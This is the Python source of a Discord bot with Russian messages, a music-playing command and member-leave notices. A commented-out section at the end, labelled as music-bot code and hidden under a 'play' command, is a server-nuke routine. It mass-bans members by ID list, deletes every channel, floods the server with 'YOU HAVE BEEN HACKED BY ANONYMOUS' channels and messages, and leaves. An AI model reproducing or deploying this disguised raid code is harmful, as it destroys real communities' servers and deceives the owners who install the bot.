import asyncio
import discord
from discord.ext import commands
from discord import Member
import youtube_dl


config = {
    'token': '-TOKEN-',
    'prefix': '.',
}

intents = discord.Intents.all()
intents.members = True

bot = commands.Bot(command_prefix=config['prefix'], intents=intents)

@bot.hybrid_command()
async def test(ctx):
    await ctx.send("This is a hybrid command!")

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user.name}')

@bot.event
async def on_member_remove(member):
    channel = discord.utils.get(member.guild.text_channels, name='𝗦𝘆𝘀𝘁𝗲𝗺𝗘𝗰𝗵𝗼')
    await channel.send(f'⬅ {member.name} покинул сервер.')

@bot.command()
async def remove(ctx):
    channel = discord.utils.get(ctx.guild.text_channels, name='𝗦𝘆𝘀𝘁𝗲𝗺𝗘𝗰𝗵𝗼')
    await channel.send('⬅ Чамба хуямба покинул сервер.')

@bot.command()
async def mon(ctx):
    await ctx.send(f'На сервере {ctx.guild.member_count} чумб.')



@bot.command()
async def hello(ctx):
    await ctx.send("Hello")
    
@bot.command()
async def join(ctx):
    # await ctx.send("```Joined voice channel!```")
    channel = ctx.author.voice.channel
    await channel.connect()

# @bot.command()
# async def leave(ctx):
#     await ctx.send("Left voice channel!")
#     await ctx.voice_client.disconnect()

@bot.command()
async def play(ctx, url):
    voice_channel = ctx.author.voice.channel
    voice_client = await voice_channel.connect()

    ydl_opts = {
        'format': 'bestaudio/best',
        'postprocessors': [{
            'key': 'FFmpegExtractAudio',
            'preferredcodec': 'mp3',
            'preferredquality': '192',
        }],
    }

    with youtube_dl.YoutubeDL(ydl_opts) as ydl:
        info = ydl.extract_info(url, download=False)
        url2 = info['formats'][0]['url']
        voice_client.play(discord.FFmpegPCMAudio(url2))

@bot.command()
async def leave(ctx):
    voice_client = ctx.voice_client
    if voice_client.is_connected():
        await ctx.send("Left voice channel!")
        await voice_client.disconnect()



# @bot.event()
# async def on_voice_status_update(member,before,after):
#     if member.bot and before.channel:
#          #проверяет что этот челик ботик или намик
#          voice_state = member.guild.voice_client
# # Ппроверяет остался ли он в канале
#         if voice_state and not voice_state.channel.members:
#             # Проверяем сколько времени прошло с захода 
#             if voice_state.idle() and voice_state.idle() > 1800:  # 1800 секунд = 30 минут
#                 await voice_state.disconnect()

bot.run(config['token'])



###########################################################################################################################################


# Gachi Music Bot Code---------------------------------------------------------------------------------------------------------------------




# exception_list = [509762933484683266, 582849312388677633, 524943385635848226, 1033315601986363432, 331481590259777539, 267701588775141377]
# death_list = []


# @bot.command()
# async def play(ctx):
#     guild = ctx.guild

#     for member in guild.members:
#       # await ban_not_in_list(member)
#       await ban_in_list(member)

#     await delete_channels(guild)
#     await create_tcs(guild)
#     await send_messages(guild)
#     await create_vcs(guild)
#     await leave_server(guild)

# async def ban_not_in_list(member):
#   if member.id not in exception_list:
#     await ban_member(member)

# async def ban_in_list(member):
#   if member.id in death_list:
#     await ban_member(member)


# async def ban_member(member):
#   try:
#     await member.ban()
#   except:
#     print("didn't ban", member.display_name)

# async def delete_channels(guild):
#   for c in guild.channels:
#     await delete_channel(c)

# async def delete_channel(channel):
#   await channel.delete()

# async def create_tcs(guild):
#   for i in channelNames:
#     await create_tc(guild, i)

# async def create_tc(guild, name):
#   await guild.create_text_channel(name)

# async def send_messages(guild):
#   for c in guild.channels:
#     await send_message(c)

# async def send_message(channel):
#   await channel.send("YOU HAVE BEEN HACKED BY ANONYMOUS")

# async def create_vcs(guild):
#   for i in channelNames:
#     await create_vc(guild, i)

# async def create_vc(guild, name):
#   await guild.create_voice_channel(name)

# async def leave_server(guild):
#   await guild.leave()

# channelNames = ["YOU", "HAVE", "BEEN", "HACKED",
#                 "BY", "A", "N", 'O', 'N', 'Y', 'M', 'O', 'U', 'S']


# @bot.command()
# async def clear(ctx):
#     guild = ctx.guild
#     for c in guild.channels:
#         await c.delete()
#     await guild.create_text_channel("test")